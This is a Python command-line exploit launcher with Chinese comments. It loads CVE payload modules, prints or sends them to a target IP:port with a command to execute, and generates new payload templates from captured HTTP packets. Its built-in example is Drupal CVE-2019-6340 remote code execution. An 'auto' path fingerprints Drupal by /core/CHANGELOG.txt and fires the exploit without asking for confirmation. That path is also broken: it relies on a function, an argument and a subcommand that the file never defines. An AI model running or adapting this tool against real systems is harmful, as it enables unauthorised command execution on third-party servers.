#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE Payload工具 - 统一的命令行工具
整合了payload生成、测试、发送和脚本生成功能
"""

import sys
import os
import json
import argparse
import importlib
import requests
from typing import Optional

# 添加当前目录到Python路径
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, current_dir)

# 强制刷新输出缓冲区
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except:
        pass

# 导入其他模块
try:
    from http_packet_parser import generate_cve_script_from_packet, parse_http_packet
except ImportError:
    generate_cve_script_from_packet = None
    parse_http_packet = None

try:
    from fingerprint import get_file_md5, get_css_files_md5_from_page
except ImportError:
    get_file_md5 = None
    get_css_files_md5_from_page = None

try:
    # 指纹注册模块，用于 “固有文件 -> PoC 函数” 的映射与触发
    from fingerprint_registry import add_fingerprint as fp_add_fingerprint, match_and_execute as fp_match_and_execute
except ImportError:
    fp_add_fingerprint = None
    fp_match_and_execute = None


def _register_builtin_fingerprints():
    """
    注册内置的“固有文件指纹 -> PoC”映射。
    目前示例：Drupal 的 /core/CHANGELOG.txt -> 使用 CVE_2019_6340 PoC 发送。
    """
    if fp_add_fingerprint is None:
        return

    # 避免重复注册：简单通过捕获异常或记录状态，这里用最轻量方式——模块级 flag
    global _BUILTIN_FP_REGISTERED  # type: ignore
    if globals().get("_BUILTIN_FP_REGISTERED"):
        return

    def drupal_changelog_poc(target_info: dict):
        """
        通过文件指纹触发的 Drupal PoC。
        target_info 约定包含：
          - ip: 目标 IP
          - port: 目标 Web 端口
          - cmd: 要执行的命令
          - timeout: 超时时间（秒）
        """
        ip = target_info.get("ip")
        port = target_info.get("port")
        cmd = target_info.get("cmd", "whoami")
        timeout = int(target_info.get("timeout", 10))

        if not ip or not port:
            raise ValueError("指纹 PoC 缺少 ip 或 port 信息")

        ip_port = f"{ip}:{port}"
        manager = PayloadManager(debug=False)
        # 这里选择 CVE_2019_6340 作为与 Drupal 指纹绑定的 PoC 模块
        return manager.send_payload("CVE_2019_6340", ip_port, cmd, timeout=timeout)

    # 基于固有文件路径注册指纹，可按需补充 file_hash 实现更精确匹配
    fp_add_fingerprint(
        fp_id="drupal_core_changelog",
        file_path="/core/CHANGELOG.txt",
        file_hash=None,
        poc_function=drupal_changelog_poc,
    )

    globals()["_BUILTIN_FP_REGISTERED"] = True


class PayloadManager:
    """Payload管理器 - 统一的payload操作接口"""
    
    def __init__(self, debug=False):
        self.debug = debug
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
    
    def _normalize_url(self, url: str, ip_port: str, headers: dict) -> str:
        """
        确保URL可直接请求。如果模块只提供了路径，自动补全协议和Host。
        """
        if url.startswith("http://") or url.startswith("https://"):
            return url
        
        host = headers.get("Host", ip_port)
        path = url if url.startswith("/") else f"/{url}"
        return f"http://{host}{path}"
    
    def load_payload_module(self, name: str):
        """动态加载payloads/下的模块"""
        try:
            if self.debug:
                print(f"[DEBUG] 当前工作目录: {os.getcwd()}")
                print(f"[DEBUG] 脚本目录: {self.current_dir}")
                print(f"[DEBUG] 尝试导入: payloads.{name}")
            
            # 检查文件是否存在
            payload_file = os.path.join(self.current_dir, "payloads", f"{name}.py")
            if not os.path.exists(payload_file):
                print(f"[!] 错误: 文件不存在: {payload_file}", file=sys.stderr, flush=True)
                print(f"[!] 请检查文件名是否正确（注意大小写和下划线）", file=sys.stderr, flush=True)
                sys.exit(1)
            
            module = importlib.import_module(f"payloads.{name}")
            if not hasattr(module, "build"):
                raise Exception(f"模块 {name} 缺少 build(ip_port, cmd) 方法")
            
            if self.debug:
                print(f"[DEBUG] 模块加载成功: {module}")
            
            return module
        except ImportError as e:
            print(f"[!] 导入模块失败: {e}", file=sys.stderr, flush=True)
            print(f"[!] 请确保 payloads/{name}.py 文件存在", file=sys.stderr, flush=True)
            if self.debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)
        except Exception as e:
            print(f"[!] 加载模块失败: {e}", file=sys.stderr, flush=True)
            if self.debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)
    
    def generate_payload(self, module_name: str, ip_port: str, cmd: str):
        """生成payload数据"""
        try:
            if self.debug:
                print(f"[DEBUG] 调用 module.build('{ip_port}', '{cmd}')")
            
            module = self.load_payload_module(module_name)
            payload_data = module.build(ip_port, cmd)
            
            if self.debug:
                print(f"[DEBUG] build() 返回类型: {type(payload_data)}")
            
            if not isinstance(payload_data, dict):
                print(f"[!] 错误: build() 方法返回的不是字典类型，而是: {type(payload_data)}", 
                      file=sys.stderr, flush=True)
                return None
            
            # 检查必需的键
            required_keys = ['url', 'headers']
            for key in required_keys:
                if key not in payload_data:
                    print(f"[!] 错误: payload_data 缺少必需的键 '{key}'", file=sys.stderr, flush=True)
                    print(f"[!] payload_data 包含的键: {list(payload_data.keys())}", 
                          file=sys.stderr, flush=True)
                    return None
            
            return payload_data
        except Exception as e:
            print(f"[!] 生成payload时发生错误: {e}", file=sys.stderr, flush=True)
            if self.debug:
                import traceback
                traceback.print_exc()
            return None
    
    def show_payload(self, module_name: str, ip_port: str, cmd: str, show_json=False):
        """显示payload的详细信息"""
        print(f"\n{'='*60}", flush=True)
        print(f"Payload生成器", flush=True)
        print(f"{'='*60}", flush=True)
        print(f"模块: {module_name}", flush=True)
        print(f"目标: {ip_port}", flush=True)
        print(f"命令: {cmd}", flush=True)
        print(f"{'='*60}\n", flush=True)
        
        print(f"[*] 加载模块: {module_name}", flush=True)
        payload_data = self.generate_payload(module_name, ip_port, cmd)
        
        if payload_data is None:
            return None
        
        print(f"[*] Payload生成成功!\n", flush=True)
        
        # 显示原始HTTP请求格式
        print("=" * 60, flush=True)
        print("[+] 原始 HTTP 请求:", flush=True)
        print("=" * 60, flush=True)
        
        # 获取HTTP方法
        http_method = payload_data.get('method', 'POST')
        
        # 构建原始HTTP请求
        host_header = payload_data['headers'].get('Host', ip_port)
        
        # 提取URL路径
        url = payload_data['url']
        if url.startswith('http://'):
            url_path = url.replace(f'http://{ip_port}', '').replace(f'http://{host_header}', '')
            if not url_path.startswith('/'):
                url_path = '/' + url_path
        elif url.startswith('https://'):
            url_path = url.replace(f'https://{ip_port}', '').replace(f'https://{host_header}', '')
            if not url_path.startswith('/'):
                url_path = '/' + url_path
        else:
            url_path = url if url.startswith('/') else '/' + url
        
        raw_request = []
        raw_request.append(f"{http_method} {url_path} HTTP/1.1")
        raw_request.append(f"Host: {host_header}")
        
        # 添加其他headers
        for header, value in payload_data['headers'].items():
            if header != 'Host':
                raw_request.append(f"{header}: {value}")
        
        raw_request.append("")  # 空行分隔headers和body
        
        # 添加请求体
        data = payload_data.get('data', None)
        if data is not None:
            if isinstance(data, dict):
                raw_request.append(json.dumps(data, separators=(',', ':')))
            elif isinstance(data, str):
                raw_request.append(data)
            else:
                raw_request.append(str(data))
        
        # 打印原始请求
        for line in raw_request:
            print(line, flush=True)
        
        print("=" * 60, flush=True)
        
        # 显示JSON格式（如果请求）
        if show_json:
            print("\n[+] Payload数据结构 (JSON):", flush=True)
            print(json.dumps({
                "method": http_method,
                "url": payload_data['url'],
                "headers": payload_data['headers'],
                "has_data": data is not None,
                "data_type": type(data).__name__ if data is not None else None
            }, indent=2, ensure_ascii=False), flush=True)
        
        return payload_data
    
    def send_payload(self, module_name: str, ip_port: str, cmd: str, timeout=10):
        """发送payload到目标"""
        print(f"\n{'='*60}", flush=True)
        print(f"发送Payload", flush=True)
        print(f"{'='*60}", flush=True)
        print(f"模块: {module_name}", flush=True)
        print(f"目标: {ip_port}", flush=True)
        print(f"命令: {cmd}", flush=True)
        print(f"{'='*60}\n", flush=True)
        
        payload_data = self.generate_payload(module_name, ip_port, cmd)
        
        if payload_data is None:
            return None
        
        headers = payload_data['headers']
        url = self._normalize_url(payload_data.get('url', ''), ip_port, headers)
        data = payload_data.get('data', None)
        method = payload_data.get('method', 'POST').upper()
        
        print(f"[+] 使用 payload 模块: {module_name}", flush=True)
        print(f"[+] 发送到 URL: {url}", flush=True)
        print(f"[+] HTTP方法: {method}", flush=True)
        print(f"[+] 执行命令: {cmd}", flush=True)
        print(f"[+] 请求超时: {timeout}秒\n", flush=True)
        
        try:
            if method == 'GET':
                response = requests.get(url, headers=headers, params=data, timeout=timeout)
            elif method == 'POST':
                response = requests.post(url, headers=headers, data=data, timeout=timeout)
            elif method == 'PUT':
                response = requests.put(url, headers=headers, data=data, timeout=timeout)
            else:
                response = requests.request(method, url, headers=headers, data=data, timeout=timeout)
            
            print("=" * 60, flush=True)
            print(f"[+] 响应状态码: {response.status_code}", flush=True)
            print("=" * 60, flush=True)
            print("响应头:", flush=True)
            for key, value in response.headers.items():
                print(f"  {key}: {value}", flush=True)
            print("\n响应体:", flush=True)
            print(response.text, flush=True)
            print("=" * 60, flush=True)
            
            return response
        except requests.exceptions.Timeout:
            print(f"[!] 请求超时（{timeout}秒）", file=sys.stderr, flush=True)
            return None
        except requests.exceptions.ConnectionError as e:
            print(f"[!] 连接错误: {e}", file=sys.stderr, flush=True)
            return None
        except Exception as e:
            print(f"[!] 发送请求时发生错误: {e}", file=sys.stderr, flush=True)
            if self.debug:
                import traceback
                traceback.print_exc()
            return None


def _escape_body_for_python_string(body: str) -> str:
    """
    对 body 内容进行转义，使其可以安全地放在 Python 普通字符串中。
    使用 repr() 自动处理所有转义，然后去掉首尾的引号。
    这样可以确保 \u0000 等特殊字符被正确转义为 \\u0000。
    """
    if not body:
        return ''
    
    # 使用 repr() 自动转义所有特殊字符
    # repr() 会返回带引号的字符串，我们需要去掉首尾的引号
    # 但要注意：repr() 可能会使用单引号或双引号，取决于内容
    escaped = repr(body)
    
    # 去掉首尾的引号（可能是单引号或双引号）
    if (escaped.startswith('"') and escaped.endswith('"')) or \
       (escaped.startswith("'") and escaped.endswith("'")):
        escaped = escaped[1:-1]
    
    # 处理三引号（如果存在）
    # 由于我们使用普通字符串，三引号需要转义
    if '"""' in escaped:
        # 如果包含三引号，需要转义（但 repr() 可能已经转义了）
        # 检查是否已经转义
        if '\\"\\"\\"' not in escaped:
            escaped = escaped.replace('"""', '\\"\\"\\"')
    
    return escaped


def _write_payload_stub(parsed: dict, cve_id: str, output_dir: str = None, gui_mode: bool = False) -> Optional[str]:
    """
    根据拆解结果生成一个 payload 模板文件，便于后续手工微调。
    """
    try:
        if output_dir is None:
            output_dir = os.path.join(current_dir, "payloads")
        os.makedirs(output_dir, exist_ok=True)

        # 保持 CVE 大写，只将编号部分转为小写（如果有的话）
        # 例如：CVE-0000-0001 -> CVE_0000_0001.py
        filename = cve_id.replace("-", "_") + ".py"
        output_path = os.path.join(output_dir, filename)

        method = parsed.get("method", "POST")
        path = parsed.get("path", "/")
        host = parsed.get("headers", {}).get("Host", "TARGET_HOST")
        body_raw = parsed.get("body", "")
        
        # 清理 path：如果 path 中包含完整的 URL（如 http://host/path），只保留路径部分
        # 同时移除可能包含的 {ip_port} 占位符
        if path.startswith("http://") or path.startswith("https://"):
            # 提取路径部分
            from urllib.parse import urlparse
            parsed_url = urlparse(path)
            path = parsed_url.path
            if parsed_url.query:
                path += "?" + parsed_url.query
            if parsed_url.fragment:
                path += "#" + parsed_url.fragment
        
        # 确保路径以 / 开头
        if not path.startswith("/"):
            path = "/" + path
        
        # 移除路径中可能包含的 {ip_port} 占位符
        path = path.replace("{ip_port}", "").replace("http://", "").replace("https://", "")

        # 对 body 进行转义处理，确保特殊字符正确转义
        body_escaped = _escape_body_for_python_string(body_raw)

        # 生成模板时，尽量保持原始包体原样，用普通三引号字符串存放（非原始字符串）
        # 这样转义后的反斜杠会正确显示为字面量
        template = f'''# {cve_id}
import json

def build(ip_port: str, cmd: str):
    url = "{path}"

    headers = {{
        "Host": ip_port,  # 使用实际目标主机
        "Content-Type": "application/hal+json",
    }}
    body = """{body_escaped}"""

    # 注意：按需替换IP端口和命令
    # body = body.replace('{{ip_port}}', ip_port)   
    # body = body.replace('s:2:\\\\"id\\\\"', f's:{{cmd_len}}:\\\\"{{cmd}}\\\\"')

    return {{
        "method": "{method}",
        "url": f"http://{{ip_port}}{{url}}",
        "headers": headers,
        "data": body,
    }}
'''

        with open(output_path, "w", encoding="utf-8") as f:
            f.write(template)

        if not gui_mode:
            print(f"\n[+] 模板已生成: {output_path}", flush=True)
            print("[!] 请手工检查并替换以下内容:", flush=True)
            print("    - url 中的协议/路径/Host", flush=True)
            print("    - headers 中的 Cookie/Token/Host 等敏感字段", flush=True)
            print("    - body 中的命令、文件名或注入点，可用 cmd 或占位符替换", flush=True)
        return output_path
    except Exception as e:
        print(f"[!] 生成模板时发生错误: {e}", file=sys.stderr, flush=True)
        if hasattr(e, "__traceback__"):
            import traceback
            traceback.print_exc()
        return None


def generate_from_packet(packet: str, cve_id: str, save: bool = False, output_dir: str = None, gui_mode: bool = False):
    """
    从HTTP数据包拆解关键信息，便于后续手工替换/改造。
    仅输出拆解结果和简单提示，不直接生成脚本，保持通用性。
    
    Args:
        packet: HTTP数据包字符串
        cve_id: CVE编号
        save: 是否保存模板文件
        output_dir: 输出目录
        gui_mode: 是否为GUI模式（不打印到控制台）
    """
    output_lines = []
    
    if not gui_mode:
        print(f"\n{'='*60}", flush=True)
        print("从HTTP数据包拆解关键信息", flush=True)
        print(f"CVE编号: {cve_id}", flush=True)
        print(f"{'='*60}\n", flush=True)
    
    output_lines.append(f"{'='*60}")
    output_lines.append("从HTTP数据包拆解关键信息")
    output_lines.append(f"CVE编号: {cve_id}")
    output_lines.append(f"{'='*60}\n")

    def _fallback_parse(raw: str):
        """简单拆包：方法、路径、头、体。"""
        lines = raw.replace("\r\n", "\n").split("\n")
        method, path, proto = "UNKNOWN", "/", "HTTP/1.1"
        headers = {}
        body_lines = []
        in_body = False
        for idx, line in enumerate(lines):
            if idx == 0 and line.strip():
                parts = line.split()
                if len(parts) >= 2:
                    method = parts[0]
                    path = parts[1]
                    proto = parts[2] if len(parts) > 2 else proto
                    
                    # 如果 path 是完整 URL（如 http://host/path），只提取路径部分
                    if path.startswith("http://") or path.startswith("https://"):
                        from urllib.parse import urlparse
                        parsed_url = urlparse(path)
                        path = parsed_url.path
                        if parsed_url.query:
                            path += "?" + parsed_url.query
                        if parsed_url.fragment:
                            path += "#" + parsed_url.fragment
                    
                    # 确保路径以 / 开头
                    if not path.startswith("/"):
                        path = "/" + path
                continue
            if not in_body:
                if line == "":
                    in_body = True
                    continue
                if ":" in line:
                    k, v = line.split(":", 1)
                    headers[k.strip()] = v.strip()
            else:
                body_lines.append(line)
        body = "\n".join(body_lines).strip()
        return {
            "request_line": f"{method} {path} {proto}",
            "method": method,
            "path": path,
            "protocol": proto,
            "headers": headers,
            "body": body,
        }

    try:
        parsed = None
        if parse_http_packet:
            # 如果存在专业解析器，先用它
            parsed = parse_http_packet(packet)
        if not parsed:
            parsed = _fallback_parse(packet)

        # 输出拆解结果
        output_lines.append("[+] 请求行: " + parsed.get("request_line", ""))
        output_lines.append("[+] 方法: " + parsed.get("method", ""))
        output_lines.append("[+] 路径: " + parsed.get("path", ""))
        output_lines.append("[+] 协议: " + parsed.get("protocol", ""))
        output_lines.append("\n[+] 头部:")
        for k, v in parsed.get("headers", {}).items():
            output_lines.append(f"  {k}: {v}")

        body = parsed.get("body", "")
        output_lines.append("\n[+] 请求体(截断展示):")
        snippet = body[:500] + ("..." if len(body) > 500 else "")
        output_lines.append(snippet)

        # 给出手工改造提示
        output_lines.append("\n提示：")
        output_lines.append("- 将敏感字段（Host、Cookie、Token、Session、路径、命令参数等）替换为目标环境值")
        output_lines.append("- 对 body 中的命令/文件名/参数做最小改动，保留结构")
        output_lines.append("- 如果需要动态插值，可把待替换字段改成占位符，例如 {CMD}、{PATH}")
        output_lines.append("- 发送前可用 show/send 子命令加载改造后的模块进行验证")

        # 打印到控制台（如果不是GUI模式）
        if not gui_mode:
            for line in output_lines:
                print(line, flush=True)

        if save:
            result_path = _write_payload_stub(parsed, cve_id, output_dir, gui_mode)
            if result_path:
                output_lines.append(f"\n[+] 模板已生成: {result_path}")
                output_lines.append("[!] 请手工检查并替换以下内容:")
                output_lines.append("    - url 中的协议/路径/Host")
                output_lines.append("    - headers 中的 Cookie/Token/Host 等敏感字段")
                output_lines.append("    - body 中的命令、文件名或注入点，可用 cmd 或占位符替换")

        # 返回结果和输出文本
        result = parsed.copy()
        result['_output_text'] = '\n'.join(output_lines)
        return result
    except Exception as e:
        error_msg = f"[!] 拆解数据包时发生错误: {e}"
        if not gui_mode:
            print(error_msg, file=sys.stderr, flush=True)
            if hasattr(e, "__traceback__"):
                import traceback
                traceback.print_exc()
        return {'_output_text': error_msg, '_error': True}


def list_payloads():
    """列出所有可用的payload"""
    payloads_dir = os.path.join(current_dir, "payloads")
    print(f"\n{'='*60}", flush=True)
    print(f"可用的Payload模块", flush=True)
    print(f"{'='*60}", flush=True)
    
    if not os.path.exists(payloads_dir):
        print(f"[!] payloads目录不存在: {payloads_dir}", file=sys.stderr, flush=True)
        return
    
    payloads = []
    manager = PayloadManager(debug=False)
    
    for filename in os.listdir(payloads_dir):
        # 跳过非Python文件
        if not filename.endswith('.py'):
            continue
        
        # 跳过特殊文件
        if filename in ('__init__.py', 'init.py'):
            continue
        
        # 跳过以__开头的文件（Python特殊文件）
        if filename.startswith('__'):
            continue
        
        module_name = filename[:-3]
        
        # 验证模块是否有效（包含build函数）
        try:
            module = manager.load_payload_module(module_name)
            if hasattr(module, 'build'):
                payloads.append(module_name)
        except:
            # 如果加载失败，跳过该模块
            continue
    
    if not payloads:
        print("[!] 未找到任何payload模块", file=sys.stderr, flush=True)
        return
    
    for i, payload in enumerate(sorted(payloads), 1):
        print(f"  {i}. {payload}", flush=True)
    
    print(f"\n共 {len(payloads)} 个payload模块", flush=True)
    print("=" * 60, flush=True)


def read_packet_file(file_path: str) -> str:
    """
    读取数据包文件，兼容不同编码/二进制内容。
    优先尝试utf-8，其次latin-1，最终使用替换策略避免解码失败。
    """
    with open(file_path, "rb") as f:
        raw = f.read()

    # 检测BOM
    if raw.startswith(b"\xff\xfe") or raw.startswith(b"\xfe\xff"):
        # UTF-16
        return raw.decode("utf-16")
    if raw.startswith(b"\xef\xbb\xbf"):
        raw = raw[3:]
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            pass

    # 尝试utf-8
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        pass

    # 尝试latin-1（无损字节到字符映射）
    try:
        return raw.decode("latin-1")
    except UnicodeDecodeError:
        # 最后使用utf-8替换非法字符
        return raw.decode("utf-8", errors="replace")


def main():
    """主函数"""
    parser = argparse.ArgumentParser(
        description='CVE Payload工具 - 统一的命令行工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 显示payload（不发送）
  %(prog)s show CVE_2019_6340 192.168.1.1:80 "id"
  
  # 发送payload
  %(prog)s send CVE_2019_6340 192.168.1.1:80 "id"
  
  # 列出所有payload
  %(prog)s list
  
  # 从HTTP数据包生成CVE脚本
  %(prog)s generate --packet-file packet.txt --cve-id CVE-2024-XXXX
  
  # 计算指定文件的MD5值（通过URL）
  %(prog)s md5 file http://192.168.1.1:80/core/CHANGELOG.txt
  
  # 访问页面，提取CSS文件并计算MD5值
  %(prog)s md5 css http://192.168.1.1:80/
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='子命令')
    
    # show命令 - 显示payload
    parser_show = subparsers.add_parser('show', help='显示payload（不发送）')
    parser_show.add_argument('module', help='Payload模块名（如: CVE_2019_6340）')
    parser_show.add_argument('ip_port', help='目标IP和端口（如: 192.168.1.1:80）')
    parser_show.add_argument('cmd', nargs='+', help='要执行的命令')
    parser_show.add_argument('--json', action='store_true', help='同时显示JSON格式')
    parser_show.add_argument('--debug', action='store_true', help='启用调试模式')
    
    # send命令 - 发送payload
    parser_send = subparsers.add_parser('send', help='发送payload到目标')
    parser_send.add_argument('module', help='Payload模块名（如: CVE_2019_6340）')
    parser_send.add_argument('ip_port', help='目标IP和端口（如: 192.168.1.1:80）')
    parser_send.add_argument('cmd', nargs='+', help='要执行的命令')
    parser_send.add_argument('--timeout', type=int, default=10, help='请求超时时间（秒，默认10）')
    parser_send.add_argument('--debug', action='store_true', help='启用调试模式')
    
    # list命令 - 列出所有payload
    parser_list = subparsers.add_parser('list', help='列出所有可用的payload模块')
    
    # generate命令 - 从HTTP数据包拆解并可生成payload模板
    parser_gen = subparsers.add_parser('generate', help='从HTTP数据包拆解并可生成payload模板')
    parser_gen.add_argument('--packet', help='HTTP数据包字符串')
    parser_gen.add_argument('--packet-file', help='HTTP数据包文件路径')
    parser_gen.add_argument('--cve-id', required=True, help='CVE编号（如: CVE-2024-XXXX）')
    parser_gen.add_argument('--output-dir', help='输出目录（默认: payloads/）')
    parser_gen.add_argument('--save', action='store_true', help='将拆解结果生成payload模板文件')
    
    # md5命令 - 通过URL计算指定文件的MD5值
    parser_md5 = subparsers.add_parser('md5', help='通过URL下载文件并计算MD5哈希值')
    md5_subparsers = parser_md5.add_subparsers(dest='md5_subcommand', help='MD5子命令')
    
    # md5 file - 计算单个文件的MD5
    parser_md5_file = md5_subparsers.add_parser('file', help='计算指定文件的MD5值')
    parser_md5_file.add_argument('url', help='文件的完整URL（如: http://192.168.1.1:80/core/CHANGELOG.txt）')
    parser_md5_file.add_argument('--timeout', type=float, default=3.0, help='请求超时时间（秒，默认3.0）')
    
    # md5 css - 从页面提取CSS文件并计算MD5
    parser_md5_css = md5_subparsers.add_parser('css', help='访问页面，提取CSS文件并计算MD5值')
    parser_md5_css.add_argument('url', help='页面URL（如: http://192.168.1.1:80/）')
    parser_md5_css.add_argument('--timeout', type=float, default=3.0, help='请求超时时间（秒，默认3.0）')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    # 注册内置文件指纹映射
    _register_builtin_fingerprints()

    manager = PayloadManager(debug=args.debug if hasattr(args, 'debug') else False)
    
    if args.command == 'show':
        cmd = ' '.join(args.cmd)
        result = manager.show_payload(args.module, args.ip_port, cmd, show_json=args.json)
        sys.exit(0 if result else 1)
    
    elif args.command == 'send':
        cmd = ' '.join(args.cmd)
        timeout = args.timeout
        result = manager.send_payload(args.module, args.ip_port, cmd, timeout=timeout)
        sys.exit(0 if result else 1)
    
    elif args.command == 'list':
        list_payloads()
        sys.exit(0)

    elif args.command == 'auto':
        if fingerprint_and_select_poc is None:
            print("[!] 指纹模块未加载，无法执行 auto 命令", file=sys.stderr, flush=True)
            sys.exit(1)

        ip = args.ip
        cmd = args.cmd
        timeout = args.timeout

        print(f"\n{'='*60}", flush=True)
        print("指纹识别与自动 POC 选择", flush=True)
        print(f"{'='*60}", flush=True)
        print(f"目标 IP: {ip}", flush=True)
        print(f"命令: {cmd}", flush=True)
        print(f"{'='*60}\n", flush=True)

        fp = fingerprint_and_select_poc(ip)

        print("[+] 指纹识别结果:", flush=True)
        print(f"  - 是否存在 Web 服务: {fp.has_web} (端口: {fp.web_ports})", flush=True)
        print(f"  - Web 固有文件指纹: {fp.web_fingerprints}", flush=True)
        if fp.web_file_hashes:
            print(f"  - Web 文件 MD5 哈希值:", flush=True)
            for file_path, md5_hash in fp.web_file_hashes.items():
                print(f"    {file_path}: {md5_hash}", flush=True)
        print(f"  - 是否存在数据库端口: {fp.has_db} (详情: {fp.db_ports})", flush=True)
        print(f"  - 选择理由: {fp.reason}", flush=True)

        # 先尝试通过 “固有文件指纹 -> PoC 注册表” 自动触发 PoC
        if fp_match_and_execute is not None and fp.has_web and fp.web_ports:
            used_registry = False
            # 目前只示例性支持 Drupal 指纹，可按需扩展更多映射
            if "drupal" in fp.web_fingerprints:
                print("\n[+] 检测到 Drupal 固有文件指纹，尝试通过指纹注册表触发 PoC...", flush=True)
                try:
                    resp = fp_match_and_execute(
                        target_file_path="/core/CHANGELOG.txt",
                        target_file_hash=None,
                        extra_target_info={
                            "ip": ip,
                            "port": fp.web_ports[0],
                            "cmd": cmd,
                            "timeout": timeout,
                        },
                    )
                    if resp is not None:
                        print("[+] 指纹注册表已成功触发 PoC。", flush=True)
                        sys.exit(0 if resp else 1)
                    else:
                        print("[!] 指纹注册表未找到匹配的 PoC，回退到内置 auto 逻辑。", flush=True)
                except Exception as e:
                    print(f"[!] 指纹注册表执行 PoC 失败: {e}", file=sys.stderr, flush=True)
                    # 继续回退到原有 auto 行为

        if fp.selected_poc and fp.target_ip_port:
            print("\n[+] 已选择 POC 模块:", flush=True)
            print(f"  模块: {fp.selected_poc}", flush=True)
            print(f"  目标: {fp.target_ip_port}", flush=True)

            manager = PayloadManager(debug=False)
            confirm = True  # 如需交互确认，可在此添加输入逻辑
            if confirm:
                print("\n[+] 尝试直接发送 POC...", flush=True)
                result = manager.send_payload(fp.selected_poc, fp.target_ip_port, cmd, timeout=timeout)
                sys.exit(0 if result else 1)
        else:
            print("\n[!] 当前未能匹配到具体 POC 模块，只输出指纹识别结果。", flush=True)
            sys.exit(1)
    
    elif args.command == 'generate':
        # 读取数据包
        if args.packet:
            packet = args.packet
        elif args.packet_file:
            if not os.path.exists(args.packet_file):
                print(f"[!] 错误: 文件不存在: {args.packet_file}", file=sys.stderr, flush=True)
                sys.exit(1)
            packet = read_packet_file(args.packet_file)
        else:
            print("[!] 错误: 必须提供 --packet 或 --packet-file", file=sys.stderr, flush=True)
            sys.exit(1)
        
        result = generate_from_packet(
            packet=packet,
            cve_id=args.cve_id,
            save=getattr(args, "save", False),
            output_dir=args.output_dir
        )
        sys.exit(0 if result else 1)
    
    elif args.command == 'md5':
        if get_file_md5 is None or get_css_files_md5_from_page is None:
            print("[!] 指纹模块未加载，无法执行 md5 命令", file=sys.stderr, flush=True)
            sys.exit(1)
        
        # 检查是否有子命令
        if not hasattr(args, 'md5_subcommand') or args.md5_subcommand is None:
            # 如果没有子命令，默认使用file命令（向后兼容）
            args.md5_subcommand = 'file'
        
        if args.md5_subcommand == 'file':
            url = args.url
            timeout = args.timeout
            
            print(f"\n{'='*60}", flush=True)
            print("计算文件 MD5 哈希值", flush=True)
            print(f"{'='*60}", flush=True)
            print(f"文件 URL: {url}", flush=True)
            print(f"{'='*60}\n", flush=True)
            
            print(f"[*] 正在下载文件并计算 MD5...", flush=True)
            md5_hash = get_file_md5(url, timeout)
            
            if md5_hash:
                print(f"\n[+] 文件 MD5 哈希值: {md5_hash}", flush=True)
                print(f"文件 URL: {url}", flush=True)
                print("=" * 60, flush=True)
                sys.exit(0)
            else:
                print(f"\n[!] 无法下载文件或计算 MD5 失败", file=sys.stderr, flush=True)
                print(f"    - 请检查 URL 是否正确", flush=True)
                print(f"    - 请检查文件是否可以访问", flush=True)
                print(f"    - 请检查网络连接是否正常", flush=True)
                sys.exit(1)
        
        elif args.md5_subcommand == 'css':
            url = args.url
            timeout = args.timeout
            
            print(f"\n{'='*60}", flush=True)
            print("提取页面CSS文件并计算MD5哈希值", flush=True)
            print(f"{'='*60}", flush=True)
            print(f"页面 URL: {url}", flush=True)
            print(f"{'='*60}\n", flush=True)
            
            print(f"[*] 正在访问页面并提取CSS文件链接...", flush=True)
            css_md5_dict = get_css_files_md5_from_page(url, timeout)
            
            if css_md5_dict:
                print(f"\n[+] 找到 {len(css_md5_dict)} 个CSS文件:\n", flush=True)
                success_count = 0
                for css_url, md5_hash in css_md5_dict.items():
                    if md5_hash:
                        print(f"  ✓ {css_url}", flush=True)
                        print(f"    MD5: {md5_hash}\n", flush=True)
                        success_count += 1
                    else:
                        print(f"  ✗ {css_url}", flush=True)
                        print(f"    下载失败\n", flush=True)
                
                print("=" * 60, flush=True)
                print(f"成功: {success_count}/{len(css_md5_dict)}", flush=True)
                sys.exit(0 if success_count > 0 else 1)
            else:
                print(f"\n[!] 未找到CSS文件或访问页面失败", file=sys.stderr, flush=True)
                print(f"    - 请检查 URL 是否正确", flush=True)
                print(f"    - 请检查页面是否可以访问", flush=True)
                print(f"    - 请检查网络连接是否正常", flush=True)
                sys.exit(1)


if __name__ == "__main__":
    main()

